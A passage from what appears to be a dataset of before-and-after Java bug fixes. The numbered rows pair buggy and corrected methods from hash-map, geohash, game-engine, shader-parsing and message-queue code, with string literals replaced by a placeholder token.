      bytes.storePositionAndSize(store,pos * smallEntrySize,smallEntrySize);
      K key2=getKey();
      if (equals(key,key2))       break;
    }
  }
  if (bytesMarshallable) {
    try {
      V v=value == null ? (V)NativeBytes.UNSAFE.allocateInstance(vClass) : value;
      ((BytesMarshallable)v).readMarshallable(bytes);
      return v;
    }
 catch (    InstantiationException e) {
      throw new AssertionError(e);
    }
  }
  return (V)bytes.readObject();
}","public synchronized V get(long h,K key,V value){
  int hash=intHashFor(h);
  smallMap.startSearch(hash);
  while (true) {
    int pos=smallMap.nextInt();
    if (pos == IntIntMultiMap.UNSET) {
      Object key2=key instanceof CharSequence ? key.toString() : key;
      final DirectStore store=map.get(key2);
      if (store == null)       return null;
      bytes.storePositionAndSize(store,0,store.size());
      break;
    }
 else {
      bytes.storePositionAndSize(store,pos * smallEntrySize,smallEntrySize);
      K key2=getKey();
      if (equals(key,key2))       break;
    }
  }
  if (bytesMarshallable) {
    try {
      V v=value == null ? (V)NativeBytes.UNSAFE.allocateInstance(vClass) : value;
      ((BytesMarshallable)v).readMarshallable(bytes);
      return v;
    }
 catch (    InstantiationException e) {
      throw new AssertionError(e);
    }
  }
  return (V)bytes.readObject();
}"
91497,"@Test public void testPutPerf() throws ExecutionException, InterruptedException {
  ExecutorService es=Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());
  System.out.println(""String_Node_Str"");
  HugeConfig config=HugeConfig.DEFAULT.clone().setSegments(64).setSmallEntrySize(72).setCapacity(COUNT);
  final HugeHashMap<CharSequence,SampleValues> map=new HugeHashMap<CharSequence,SampleValues>(config,CharSequence.class,SampleValues.class);
  final int COUNT=500000;
  final String[] users=new String[COUNT];
  for (int i=0; i < COUNT; i++)   users[i]=""String_Node_Str"" + i;
  long start=System.nanoTime();
  List<Future<?>> futures=new ArrayList<Future<?>>();
  for (int t=0; t < N_THREADS; t++) {
    final int finalT=t;
    futures.add(es.submit(new Runnable(){
      @Override public void run(){
        final SampleValues value=new SampleValues();
        StringBuilder user=new StringBuilder();
        for (int i=finalT; i < COUNT; i+=N_THREADS) {
          value.ee=i;
          value.gg=i;
          value.ii=i;
          map.put(users(user,i),value);
        }
        for (int i=finalT; i < COUNT; i+=N_THREADS) {
          assertNotNull(map.get(users(user,i),value));
          assertEquals(i,value.ee);
          assertEquals(i,value.gg,0.0);
          assertEquals(i,value.ii);
        }
        for (int i=finalT; i < COUNT; i+=N_THREADS)         assertNotNull(map.get(users(user,i),value));
        for (int i=finalT; i < COUNT; i+=N_THREADS)         map.remove(users(user,i));
      }
    }
));
  }
  for (  Future<?> future : futures)   future.get();
  long time=System.nanoTime() - start;
  System.out.printf(""String_Node_Str"",(int)(COUNT * 4 * 1e6 / time));
  es.shutdown();
}","@Test public void testPutPerf() throws ExecutionException, InterruptedException {
  ExecutorService es=Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());
  System.out.println(""String_Node_Str"");
  HugeConfig config=HugeConfig.DEFAULT.clone().setSegments(128).setSmallEntrySize(72).setCapacity(COUNT);
  final HugeHashMap<CharSequence,SampleValues> map=new HugeHashMap<CharSequence,SampleValues>(config,CharSequence.class,SampleValues.class);
  final String[] users=new String[COUNT];
  for (int i=0; i < COUNT; i++)   users[i]=""String_Node_Str"" + i;
  long start=System.nanoTime();
  List<Future<?>> futures=new ArrayList<Future<?>>();
  for (int t=0; t < N_THREADS; t++) {
    final int finalT=t;
    futures.add(es.submit(new Runnable(){
      @Override public void run(){
        final SampleValues value=new SampleValues();
        StringBuilder user=new StringBuilder();
        for (int i=finalT; i < COUNT; i+=N_THREADS) {
          value.ee=i;
          value.gg=i;
          value.ii=i;
          map.put(users(user,i),value);
        }
        for (int i=finalT; i < COUNT; i+=N_THREADS) {
          assertNotNull(map.get(users(user,i),value));
          assertEquals(i,value.ee);
          assertEquals(i,value.gg,0.0);
          assertEquals(i,value.ii);
        }
        for (int i=finalT; i < COUNT; i+=N_THREADS)         assertNotNull(map.get(users(user,i),value));
        for (int i=finalT; i < COUNT; i+=N_THREADS)         map.remove(users(user,i));
      }
    }
));
  }
  for (  Future<?> future : futures)   future.get();
  long time=System.nanoTime() - start;
  System.out.printf(""String_Node_Str"",(int)(COUNT * 4 * 1e6 / time));
  es.shutdown();
}"
91498,"@Test public void testPut() throws ExecutionException, InterruptedException {
  int count=4000000;
  HugeConfig config=HugeConfig.DEFAULT.clone().setSegments(128).setSmallEntrySize(72).setCapacity(count);
  final HugeHashMap<CharSequence,SampleValues> map=new HugeHashMap<CharSequence,SampleValues>(config,CharSequence.class,SampleValues.class);
  long start=System.nanoTime();
  final SampleValues value=new SampleValues();
  StringBuilder user=new StringBuilder();
  for (int i=0; i < count; i++) {
    value.ee=i;
    value.gg=i;
    value.ii=i;
    map.put(users(user,i),value);
  }
  for (int i=0; i < count; i++) {
    assertNotNull(map.get(users(user,i),value));
    assertEquals(i,value.ee);
    assertEquals(i,value.gg,0.0);
    assertEquals(i,value.ii);
  }
  for (int i=0; i < count; i++)   assertNotNull(map.get(users(user,i),value));
  for (int i=0; i < count; i++)   map.remove(users(user,i));
  long time=System.nanoTime() - start;
  System.out.printf(""String_Node_Str"",(int)(count * 4 * 1e6 / time));
}","@Test public void testPut() throws ExecutionException, InterruptedException {
  int count=4000000;
  HugeConfig config=HugeConfig.DEFAULT.clone().setSegments(256).setSmallEntrySize(72).setCapacity(count);
  final HugeHashMap<CharSequence,SampleValues> map=new HugeHashMap<CharSequence,SampleValues>(config,CharSequence.class,SampleValues.class);
  long start=System.nanoTime();
  final SampleValues value=new SampleValues();
  StringBuilder user=new StringBuilder();
  for (int i=0; i < count; i++) {
    value.ee=i;
    value.gg=i;
    value.ii=i;
    map.put(users(user,i),value);
  }
  for (int i=0; i < count; i++) {
    assertNotNull(map.get(users(user,i),value));
    assertEquals(i,value.ee);
    assertEquals(i,value.gg,0.0);
    assertEquals(i,value.ii);
  }
  for (int i=0; i < count; i++)   assertNotNull(map.get(users(user,i),value));
  for (int i=0; i < count; i++)   map.remove(users(user,i));
  long time=System.nanoTime() - start;
  System.out.printf(""String_Node_Str"",(int)(count * 4 * 1e6 / time));
}"
91499,"public long entriesPerSegment(){
  long epg1=((entries * 3 / 2) / segments);
  return (Math.max(1,epg1) + 63) & ~63;
}","public long entriesPerSegment(){
  long epg1=(long)((entries * INCREASE_ENTRIES_PER_SECTOR) / segments);
  return (Math.max(1,epg1) + 63) & ~63;
}"
91500,"private SharedHashMapBuilder readFile(File file) throws IOException {
  ByteBuffer bb=ByteBuffer.allocateDirect(HEADER_SIZE).order(ByteOrder.nativeOrder());
  FileInputStream fis=new FileInputStream(file);
  fis.getChannel().read(bb);
  fis.close();
  bb.flip();
  if (bb.remaining() <= 20)   throw new IOException(""String_Node_Str"" + file);
  byte[] bytes=new byte[8];
  bb.get(bytes);
  if (!Arrays.equals(bytes,MAGIC))   throw new IOException(""String_Node_Str"" + new String(bytes,0));
  SharedHashMapBuilder builder=new SharedHashMapBuilder();
  builder.segments(bb.getInt());
  builder.entries(bb.getLong() * builder.segments());
  builder.entrySize(bb.getInt());
  builder.replicas(bb.getInt());
  builder.transactional(bb.get() == 'Y');
  if (segments() <= 0 || entries() <= 0 || entrySize() <= 0)   throw new IOException(""String_Node_Str"" + file);
  return builder;
}","private SharedHashMapBuilder readFile(File file) throws IOException {
  ByteBuffer bb=ByteBuffer.allocateDirect(HEADER_SIZE).order(ByteOrder.nativeOrder());
  FileInputStream fis=new FileInputStream(file);
  fis.getChannel().read(bb);
  fis.close();
  bb.flip();
  if (bb.remaining() <= 20)   throw new IOException(""String_Node_Str"" + file);
  byte[] bytes=new byte[8];
  bb.get(bytes);
  if (!Arrays.equals(bytes,MAGIC))   throw new IOException(""String_Node_Str"" + new String(bytes,0));
  SharedHashMapBuilder builder=new SharedHashMapBuilder();
  builder.segments(bb.getInt());
  builder.entries((long)(bb.getLong() * builder.segments() / INCREASE_ENTRIES_PER_SECTOR));
  builder.entrySize(bb.getInt());
  builder.replicas(bb.getInt());
  builder.transactional(bb.get() == 'Y');
  if (segments() <= 0 || entries() <= 0 || entrySize() <= 0)   throw new IOException(""String_Node_Str"" + file);
  return builder;
}"
91501,"/** 
 * Returns the hashes that are required to cover the given bounding box. The maximum length of hash is selected that satisfies the number of hashes returned is less than <code>maxHashes</code>. Returns null if hashes cannot be found satisfying that condition. Maximum hash length returned will be   {@link GeoHash}.MAX_HASH_LENGTH.
 * @param topLeftLat
 * @param topLeftLon
 * @param bottomRightLat
 * @param bottomRightLon
 * @param maxHashes
 * @return
 */
public static Coverage coverBoundingBoxMaxHashes(double topLeftLat,final double topLeftLon,final double bottomRightLat,final double bottomRightLon,int maxHashes){
  Coverage coverage=null;
  int startLength=hashLengthToCoverBoundingBox(topLeftLat,topLeftLon,bottomRightLat,bottomRightLon);
  for (int length=startLength; length <= MAX_HASH_LENGTH; length++) {
    Coverage c=coverBoundingBox(topLeftLat,topLeftLon,bottomRightLat,bottomRightLon,length);
    if (c.getHashes().size() > maxHashes)     return coverage;
 else     coverage=c;
  }
  return coverage;
}","/** 
 * Returns the hashes that are required to cover the given bounding box. The maximum length of hash is selected that satisfies the number of hashes returned is less than <code>maxHashes</code>. Returns null if hashes cannot be found satisfying that condition. Maximum hash length returned will be   {@link GeoHash}.MAX_HASH_LENGTH.
 * @param topLeftLat
 * @param topLeftLon
 * @param bottomRightLat
 * @param bottomRightLon
 * @param maxHashes
 * @return
 */
public static Coverage coverBoundingBoxMaxHashes(double topLeftLat,final double topLeftLon,final double bottomRightLat,final double bottomRightLon,int maxHashes){
  Coverage coverage=null;
  int startLength=hashLengthToCoverBoundingBox(topLeftLat,topLeftLon,bottomRightLat,bottomRightLon);
  if (startLength == 0)   startLength=1;
  for (int length=startLength; length <= MAX_HASH_LENGTH; length++) {
    Coverage c=coverBoundingBox(topLeftLat,topLeftLon,bottomRightLat,bottomRightLon,length);
    if (c.getHashes().size() > maxHashes)     return coverage;
 else     coverage=c;
  }
  return coverage;
}"
91502,"public void add(double lat,double lon,long time,T t,Optional<Long> expiryTime){
  String hash=GeoHash.encodeHash(lat,lon);
  for (int i=1; i <= hash.length(); i++) {
    long key=Base32.decodeBase32(hash.substring(0,i));
    if (map.get(key) == null) {
      map.put(key,new ConcurrentSkipListMap<Long,Info<T>>());
    }
    map.get(key).put(time,new Info<T>(key,lat,lon,time,t));
  }
}","public void add(double lat,double lon,long time,T t,Optional<R> id){
  String hash=GeoHash.encodeHash(lat,lon);
  addToMap(map,lat,lon,time,t,hash);
  addToMapById(lat,lon,time,t,id,hash);
}"
91503,"public Iterable<Info<T>> find(long start,long finish,String withinHash){
  long key=Base32.decodeBase32(withinHash);
  SortedMap<Long,Info<T>> sortedByTime=map.get(key);
  return sortedByTime.subMap(start,finish).values();
}","private Iterable<Info<T>> find(long start,long finish,String withinHash){
  long key=Base32.decodeBase32(withinHash);
  SortedMap<Long,Info<T>> sortedByTime=map.get(key);
  if (sortedByTime == null)   return Collections.emptyList();
 else   return sortedByTime.subMap(start,finish).values();
}"
91504,"private void run(){
  isRunning=true;
  int frames=0;
  long frameCounter=0;
  game.init();
  double lastTime=Time.getTime();
  double unprocessedTime=0;
  while (isRunning) {
    boolean render=false;
    double startTime=Time.getTime();
    double passedTime=startTime - lastTime;
    lastTime=startTime;
    unprocessedTime+=passedTime;
    frameCounter+=passedTime;
    while (unprocessedTime > frameTime) {
      render=true;
      unprocessedTime-=frameTime;
      if (Window.isCloseRequested())       stop();
      game.input((float)frameTime);
      Input.update();
      game.update((float)frameTime);
      if (frameCounter >= 1.0) {
        System.out.println(frames);
        frames=0;
        frameCounter=0;
      }
    }
    if (render) {
      game.render(renderingEngine);
      Window.render();
      frames++;
    }
 else {
      try {
        Thread.sleep(1);
      }
 catch (      InterruptedException e) {
        e.printStackTrace();
      }
    }
  }
  cleanUp();
}","private void run(){
  isRunning=true;
  int frames=0;
  double frameCounter=0;
  game.init();
  double lastTime=Time.getTime();
  double unprocessedTime=0;
  while (isRunning) {
    boolean render=false;
    double startTime=Time.getTime();
    double passedTime=startTime - lastTime;
    lastTime=startTime;
    unprocessedTime+=passedTime;
    frameCounter+=passedTime;
    while (unprocessedTime > frameTime) {
      render=true;
      unprocessedTime-=frameTime;
      if (Window.isCloseRequested())       stop();
      game.input((float)frameTime);
      Input.update();
      game.update((float)frameTime);
      if (frameCounter >= 1.0) {
        System.out.println(frames);
        frames=0;
        frameCounter=0;
      }
    }
    if (render) {
      game.render(renderingEngine);
      Window.render();
      frames++;
    }
 else {
      try {
        Thread.sleep(1);
      }
 catch (      InterruptedException e) {
        e.printStackTrace();
      }
    }
  }
  cleanUp();
}"
91505,"private HashMap<String,ArrayList<GLSLStruct>> findUniformStructs(String shaderText){
  HashMap<String,ArrayList<GLSLStruct>> result=new HashMap<String,ArrayList<GLSLStruct>>();
  final String STRUCT_KEYWORD=""String_Node_Str"";
  int structStartLocation=shaderText.indexOf(STRUCT_KEYWORD);
  while (structStartLocation != -1) {
    if (!(structStartLocation != 0 && (Character.isWhitespace(shaderText.charAt(structStartLocation - 1)) || shaderText.charAt(structStartLocation - 1) == ';') && Character.isWhitespace(shaderText.charAt(structStartLocation + STRUCT_KEYWORD.length()))))     continue;
    int nameBegin=structStartLocation + STRUCT_KEYWORD.length() + 1;
    int braceBegin=shaderText.indexOf(""String_Node_Str"",nameBegin);
    int braceEnd=shaderText.indexOf(""String_Node_Str"",braceBegin);
    String structName=shaderText.substring(nameBegin,braceBegin).trim();
    ArrayList<GLSLStruct> glslStructs=new ArrayList<GLSLStruct>();
    int componentSemicolonPos=shaderText.indexOf(""String_Node_Str"",braceBegin);
    while (componentSemicolonPos != -1 && componentSemicolonPos < braceEnd) {
      int componentNameEnd=componentSemicolonPos + 1;
      while (Character.isWhitespace(shaderText.charAt(componentNameEnd - 1)) || shaderText.charAt(componentNameEnd - 1) == ';')       componentNameEnd--;
      int componentNameStart=componentSemicolonPos;
      while (!Character.isWhitespace(shaderText.charAt(componentNameStart - 1)))       componentNameStart--;
      int componentTypeEnd=componentNameStart;
      while (Character.isWhitespace(shaderText.charAt(componentTypeEnd - 1)))       componentTypeEnd--;
      int componentTypeStart=componentTypeEnd;
      while (!Character.isWhitespace(shaderText.charAt(componentTypeStart - 1)))       componentTypeStart--;
      String componentName=shaderText.substring(componentNameStart,componentNameEnd);
      String componentType=shaderText.substring(componentTypeStart,componentTypeEnd);
      GLSLStruct glslStruct=new GLSLStruct();
      glslStruct.name=componentName;
      glslStruct.type=componentType;
      glslStructs.add(glslStruct);
      componentSemicolonPos=shaderText.indexOf(""String_Node_Str"",componentSemicolonPos + 1);
    }
    result.put(structName,glslStructs);
    structStartLocation=shaderText.indexOf(STRUCT_KEYWORD,structStartLocation + STRUCT_KEYWORD.length());
  }
  return result;
}","private HashMap<String,ArrayList<GLSLStruct>> findUniformStructs(String shaderText){
  HashMap<String,ArrayList<GLSLStruct>> result=new HashMap<String,ArrayList<GLSLStruct>>();
  final String STRUCT_KEYWORD=""String_Node_Str"";
  int structStartLocation=shaderText.indexOf(STRUCT_KEYWORD);
  while (structStartLocation != -1) {
    if (!(structStartLocation != 0 && (Character.isWhitespace(shaderText.charAt(structStartLocation - 1)) || shaderText.charAt(structStartLocation - 1) == ';') && Character.isWhitespace(shaderText.charAt(structStartLocation + STRUCT_KEYWORD.length())))) {
      structStartLocation=shaderText.indexOf(STRUCT_KEYWORD,structStartLocation + STRUCT_KEYWORD.length());
      continue;
    }
    int nameBegin=structStartLocation + STRUCT_KEYWORD.length() + 1;
    int braceBegin=shaderText.indexOf(""String_Node_Str"",nameBegin);
    int braceEnd=shaderText.indexOf(""String_Node_Str"",braceBegin);
    String structName=shaderText.substring(nameBegin,braceBegin).trim();
    ArrayList<GLSLStruct> glslStructs=new ArrayList<GLSLStruct>();
    int componentSemicolonPos=shaderText.indexOf(""String_Node_Str"",braceBegin);
    while (componentSemicolonPos != -1 && componentSemicolonPos < braceEnd) {
      int componentNameEnd=componentSemicolonPos + 1;
      while (Character.isWhitespace(shaderText.charAt(componentNameEnd - 1)) || shaderText.charAt(componentNameEnd - 1) == ';')       componentNameEnd--;
      int componentNameStart=componentSemicolonPos;
      while (!Character.isWhitespace(shaderText.charAt(componentNameStart - 1)))       componentNameStart--;
      int componentTypeEnd=componentNameStart;
      while (Character.isWhitespace(shaderText.charAt(componentTypeEnd - 1)))       componentTypeEnd--;
      int componentTypeStart=componentTypeEnd;
      while (!Character.isWhitespace(shaderText.charAt(componentTypeStart - 1)))       componentTypeStart--;
      String componentName=shaderText.substring(componentNameStart,componentNameEnd);
      String componentType=shaderText.substring(componentTypeStart,componentTypeEnd);
      GLSLStruct glslStruct=new GLSLStruct();
      glslStruct.name=componentName;
      glslStruct.type=componentType;
      glslStructs.add(glslStruct);
      componentSemicolonPos=shaderText.indexOf(""String_Node_Str"",componentSemicolonPos + 1);
    }
    result.put(structName,glslStructs);
    structStartLocation=shaderText.indexOf(STRUCT_KEYWORD,structStartLocation + STRUCT_KEYWORD.length());
  }
  return result;
}"
91506,"private void addAllUniforms(String shaderText){
  HashMap<String,ArrayList<GLSLStruct>> structs=findUniformStructs(shaderText);
  final String UNIFORM_KEYWORD=""String_Node_Str"";
  int uniformStartLocation=shaderText.indexOf(UNIFORM_KEYWORD);
  while (uniformStartLocation != -1) {
    if (!(uniformStartLocation != 0 && (Character.isWhitespace(shaderText.charAt(uniformStartLocation - 1)) || shaderText.charAt(uniformStartLocation - 1) == ';') && Character.isWhitespace(shaderText.charAt(uniformStartLocation + UNIFORM_KEYWORD.length()))))     continue;
    int begin=uniformStartLocation + UNIFORM_KEYWORD.length() + 1;
    int end=shaderText.indexOf(""String_Node_Str"",begin);
    String uniformLine=shaderText.substring(begin,end).trim();
    int whiteSpacePos=uniformLine.indexOf(' ');
    String uniformName=uniformLine.substring(whiteSpacePos + 1,uniformLine.length()).trim();
    String uniformType=uniformLine.substring(0,whiteSpacePos).trim();
    resource.getUniformNames().add(uniformName);
    resource.getUniformTypes().add(uniformType);
    addUniform(uniformName,uniformType,structs);
    uniformStartLocation=shaderText.indexOf(UNIFORM_KEYWORD,uniformStartLocation + UNIFORM_KEYWORD.length());
  }
}","private void addAllUniforms(String shaderText){
  HashMap<String,ArrayList<GLSLStruct>> structs=findUniformStructs(shaderText);
  final String UNIFORM_KEYWORD=""String_Node_Str"";
  int uniformStartLocation=shaderText.indexOf(UNIFORM_KEYWORD);
  while (uniformStartLocation != -1) {
    if (!(uniformStartLocation != 0 && (Character.isWhitespace(shaderText.charAt(uniformStartLocation - 1)) || shaderText.charAt(uniformStartLocation - 1) == ';') && Character.isWhitespace(shaderText.charAt(uniformStartLocation + UNIFORM_KEYWORD.length())))) {
      uniformStartLocation=shaderText.indexOf(UNIFORM_KEYWORD,uniformStartLocation + UNIFORM_KEYWORD.length());
      continue;
    }
    int begin=uniformStartLocation + UNIFORM_KEYWORD.length() + 1;
    int end=shaderText.indexOf(""String_Node_Str"",begin);
    String uniformLine=shaderText.substring(begin,end).trim();
    int whiteSpacePos=uniformLine.indexOf(' ');
    String uniformName=uniformLine.substring(whiteSpacePos + 1,uniformLine.length()).trim();
    String uniformType=uniformLine.substring(0,whiteSpacePos).trim();
    resource.getUniformNames().add(uniformName);
    resource.getUniformTypes().add(uniformType);
    addUniform(uniformName,uniformType,structs);
    uniformStartLocation=shaderText.indexOf(UNIFORM_KEYWORD,uniformStartLocation + UNIFORM_KEYWORD.length());
  }
}"
91507,"private void addAllAttributes(String shaderText){
  final String ATTRIBUTE_KEYWORD=""String_Node_Str"";
  int attributeStartLocation=shaderText.indexOf(ATTRIBUTE_KEYWORD);
  int attribNumber=0;
  while (attributeStartLocation != -1) {
    if (!(attributeStartLocation != 0 && (Character.isWhitespace(shaderText.charAt(attributeStartLocation - 1)) || shaderText.charAt(attributeStartLocation - 1) == ';') && Character.isWhitespace(shaderText.charAt(attributeStartLocation + ATTRIBUTE_KEYWORD.length()))))     continue;
    int begin=attributeStartLocation + ATTRIBUTE_KEYWORD.length() + 1;
    int end=shaderText.indexOf(""String_Node_Str"",begin);
    String attributeLine=shaderText.substring(begin,end).trim();
    String attributeName=attributeLine.substring(attributeLine.indexOf(' ') + 1,attributeLine.length()).trim();
    setAttribLocation(attributeName,attribNumber);
    attribNumber++;
    attributeStartLocation=shaderText.indexOf(ATTRIBUTE_KEYWORD,attributeStartLocation + ATTRIBUTE_KEYWORD.length());
  }
}","private void addAllAttributes(String shaderText){
  final String ATTRIBUTE_KEYWORD=""String_Node_Str"";
  int attributeStartLocation=shaderText.indexOf(ATTRIBUTE_KEYWORD);
  int attribNumber=0;
  while (attributeStartLocation != -1) {
    if (!(attributeStartLocation != 0 && (Character.isWhitespace(shaderText.charAt(attributeStartLocation - 1)) || shaderText.charAt(attributeStartLocation - 1) == ';') && Character.isWhitespace(shaderText.charAt(attributeStartLocation + ATTRIBUTE_KEYWORD.length())))) {
      attributeStartLocation=shaderText.indexOf(ATTRIBUTE_KEYWORD,attributeStartLocation + ATTRIBUTE_KEYWORD.length());
      continue;
    }
    int begin=attributeStartLocation + ATTRIBUTE_KEYWORD.length() + 1;
    int end=shaderText.indexOf(""String_Node_Str"",begin);
    String attributeLine=shaderText.substring(begin,end).trim();
    String attributeName=attributeLine.substring(attributeLine.indexOf(' ') + 1,attributeLine.length()).trim();
    setAttribLocation(attributeName,attribNumber);
    attribNumber++;
    attributeStartLocation=shaderText.indexOf(ATTRIBUTE_KEYWORD,attributeStartLocation + ATTRIBUTE_KEYWORD.length());
  }
}"
91508,"public void calcTangents(){
  for (int i=0; i < indices.size(); i+=3) {
    int i0=indices.get(i);
    int i1=indices.get(i + 1);
    int i2=indices.get(i + 2);
    Vector3f edge1=positions.get(i1).sub(positions.get(i0));
    Vector3f edge2=positions.get(i2).sub(positions.get(i0));
    float deltaU1=texCoords.get(i1).getX() - texCoords.get(i0).getX();
    float deltaV1=texCoords.get(i1).getY() - texCoords.get(i0).getY();
    float deltaU2=texCoords.get(i2).getX() - texCoords.get(i0).getX();
    float deltaV2=texCoords.get(i2).getY() - texCoords.get(i0).getY();
    float f=1.0f / (deltaU1 * deltaV2 - deltaU2 * deltaV1);
    Vector3f tangent=new Vector3f(0,0,0);
    tangent.setX(f * (deltaV2 * edge1.getX() - deltaV1 * edge2.getX()));
    tangent.setY(f * (deltaV2 * edge1.getY() - deltaV1 * edge2.getY()));
    tangent.setZ(f * (deltaV2 * edge1.getZ() - deltaV1 * edge2.getZ()));
    tangents.get(i0).set(tangents.get(i0).add(tangent));
    tangents.get(i1).set(tangents.get(i1).add(tangent));
    tangents.get(i2).set(tangents.get(i2).add(tangent));
  }
  for (int i=0; i < tangents.size(); i++)   tangents.get(i).set(tangents.get(i).normalized());
}","public void calcTangents(){
  for (int i=0; i < indices.size(); i+=3) {
    int i0=indices.get(i);
    int i1=indices.get(i + 1);
    int i2=indices.get(i + 2);
    Vector3f edge1=positions.get(i1).sub(positions.get(i0));
    Vector3f edge2=positions.get(i2).sub(positions.get(i0));
    float deltaU1=texCoords.get(i1).getX() - texCoords.get(i0).getX();
    float deltaV1=texCoords.get(i1).getY() - texCoords.get(i0).getY();
    float deltaU2=texCoords.get(i2).getX() - texCoords.get(i0).getX();
    float deltaV2=texCoords.get(i2).getY() - texCoords.get(i0).getY();
    float dividend=(deltaU1 * deltaV2 - deltaU2 * deltaV1);
    float f=dividend == 0 ? 1.0f : 1.0f / dividend;
    Vector3f tangent=new Vector3f(0,0,0);
    tangent.setX(f * (deltaV2 * edge1.getX() - deltaV1 * edge2.getX()));
    tangent.setY(f * (deltaV2 * edge1.getY() - deltaV1 * edge2.getY()));
    tangent.setZ(f * (deltaV2 * edge1.getZ() - deltaV1 * edge2.getZ()));
    tangents.get(i0).set(tangents.get(i0).add(tangent));
    tangents.get(i1).set(tangents.get(i1).add(tangent));
    tangents.get(i2).set(tangents.get(i2).add(tangent));
  }
  for (int i=0; i < tangents.size(); i++)   tangents.get(i).set(tangents.get(i).normalized());
}"
91509,"public RenderingEngine(){
  super();
  lights=new ArrayList<BaseLight>();
  samplerMap=new HashMap<String,Integer>();
  samplerMap.put(""String_Node_Str"",0);
  samplerMap.put(""String_Node_Str"",1);
  addVector3f(""String_Node_Str"",new Vector3f(0.1f,0.1f,0.1f));
  forwardAmbient=new Shader(""String_Node_Str"");
  glClearColor(0.0f,0.0f,0.0f,0.0f);
  glFrontFace(GL_CW);
  glCullFace(GL_BACK);
  glEnable(GL_CULL_FACE);
  glEnable(GL_DEPTH_TEST);
  glEnable(GL_DEPTH_CLAMP);
  glEnable(GL_TEXTURE_2D);
}","public RenderingEngine(){
  super();
  lights=new ArrayList<BaseLight>();
  samplerMap=new HashMap<String,Integer>();
  samplerMap.put(""String_Node_Str"",0);
  samplerMap.put(""String_Node_Str"",1);
  addVector3f(""String_Node_Str"",new Vector3f(0.1f,0.1f,0.1f));
  forwardAmbient=new Shader(""String_Node_Str"");
  glClearColor(0.0f,0.0f,0.0f,0.0f);
  glFrontFace(GL_CW);
  glCullFace(GL_BACK);
  glEnable(GL_CULL_FACE);
  glEnable(GL_DEPTH_TEST);
  glEnable(GL_TEXTURE_2D);
}"
91510,"@Override public void nextTuple(){
  if (!active)   return;
  Message message;
  while ((message=consumer.nextMessage()) != Message.NONE) {
    List<Object> tuple=extractTuple(message);
    if (!tuple.isEmpty()) {
      emit(tuple,message,collector);
    }
  }
}","@Override public void nextTuple(){
  if (!active)   return;
  int emitted=0;
  Message message;
  while (emitted < prefetchCount && (message=consumer.nextMessage()) != Message.NONE) {
    List<Object> tuple=extractTuple(message);
    if (!tuple.isEmpty()) {
      emit(tuple,message,collector);
      emitted+=1;
    }
  }
}"
91511,"@Override public void open(final Map config,final TopologyContext context,final SpoutOutputCollector spoutOutputCollector){
  ConsumerConfig consumerConfig=ConsumerConfig.getFromStormConfig(config);
  ErrorReporter reporter=new ErrorReporter(){
    @Override public void reportError(    Throwable error){
      spoutOutputCollector.reportError(error);
    }
  }
;
  consumer=loadConsumer(declarator,reporter,consumerConfig);
  scheme.open(config,context);
  consumer.open();
  logger=LoggerFactory.getLogger(RabbitMQSpout.class);
  collector=spoutOutputCollector;
  active=true;
}","@Override public void open(final Map config,final TopologyContext context,final SpoutOutputCollector spoutOutputCollector){
  ConsumerConfig consumerConfig=ConsumerConfig.getFromStormConfig(config);
  ErrorReporter reporter=new ErrorReporter(){
    @Override public void reportError(    Throwable error){
      spoutOutputCollector.reportError(error);
    }
  }
;
  consumer=loadConsumer(declarator,reporter,consumerConfig);
  scheme.open(config,context);
  consumer.open();
  prefetchCount=consumerConfig.getPrefetchCount();
  logger=LoggerFactory.getLogger(RabbitMQSpout.class);
  collector=spoutOutputCollector;
  active=true;
}"
91512,"protected List<Integer> emit(List<Object> tuple,Message message,SpoutOutputCollector spoutOutputCollector){
  return spoutOutputCollector.emit(tuple,getDeliveryTag(message));
}","protected List<Integer> emit(List<Object> tuple,Message message,SpoutOutputCollector spoutOutputCollector){
  return streamId == null ? spoutOutputCollector.emit(tuple,getDeliveryTag(message)) : spoutOutputCollector.emit(streamId,tuple,getDeliveryTag(message));
}"
91513,"private void toAdaptiveMap(Set<String> mapped){
  AdaptiveMap adaptiveMap=(AdaptiveMap)target;
  Set<Keyword> mappedKeywords=new HashSet<>();
  final boolean keywordMatching=rule.keywordMatching();
  if (keywordMatching) {
    for (    String s : mapped) {
      mappedKeywords.add(Keyword.of(s));
    }
  }
  boolean targetComponentIsSequence=isSequence(targetComponentRawType);
  boolean targetComponentIsMap=!targetComponentIsSequence && isMap(targetComponentRawType);
  boolean targetComponentIsContainer=targetComponentIsMap || targetComponentIsSequence;
  String prefix=context.toString();
  for (  $.Triple<Object,Keyword,$.Producer<Object>> sourceProperty : sourceProperties()) {
    Object sourceKey=sourceProperty.first();
    if (mapped.contains(sourceKey)) {
      continue;
    }
    if (keywordMatching && mappedKeywords.contains(Keyword.of(S.string(sourceKey)))) {
      continue;
    }
    if (!ignoreGlobalFilter && sourceKey instanceof String && OsglConfig.globalMappingFilter_shouldIgnore(sourceKey.toString())) {
      continue;
    }
    if (!semantic.allowTypeConvert() && !$.is(sourceKey).allowBoxing().instanceOf(targetKeyType)) {
      logError(""String_Node_Str"",targetKeyType,sourceKey.getClass().getName());
      continue;
    }
    Object sourceVal=sourceProperty.last().produce();
    if (null == sourceVal) {
      continue;
    }
    Object targetKey=sourceKey;
    String key=S.notBlank(prefix) ? S.pathConcat(prefix,'.',targetKey.toString()) : targetKey.toString();
    if (!filter.test(key)) {
      continue;
    }
    Object targetVal=adaptiveMap.getValue(targetKey.toString());
    if (null != keyTransformer) {
      targetKey=keyTransformer.apply(targetKey);
    }
    targetVal=prepareTargetComponent(sourceVal,targetVal,targetComponentRawType,targetComponentType,targetComponentIsContainer,""String_Node_Str"");
    adaptiveMap.putValue(targetKey.toString(),targetVal);
  }
}","private void toAdaptiveMap(Set<String> mapped){
  AdaptiveMap adaptiveMap=(AdaptiveMap)target;
  Set<Keyword> mappedKeywords=new HashSet<>();
  final boolean keywordMatching=rule.keywordMatching();
  if (keywordMatching) {
    for (    String s : mapped) {
      mappedKeywords.add(Keyword.of(s));
    }
  }
  boolean targetComponentIsSequence=isSequence(targetComponentRawType);
  boolean targetComponentIsMap=!targetComponentIsSequence && isMap(targetComponentRawType);
  boolean targetComponentIsContainer=targetComponentIsMap || targetComponentIsSequence;
  String prefix=context.toString();
  for (  $.Triple<Object,Keyword,$.Producer<Object>> sourceProperty : sourceProperties()) {
    Object sourceKey=sourceProperty.first();
    if (mapped.contains(sourceKey)) {
      continue;
    }
    if (keywordMatching && mappedKeywords.contains(Keyword.of(S.string(sourceKey)))) {
      continue;
    }
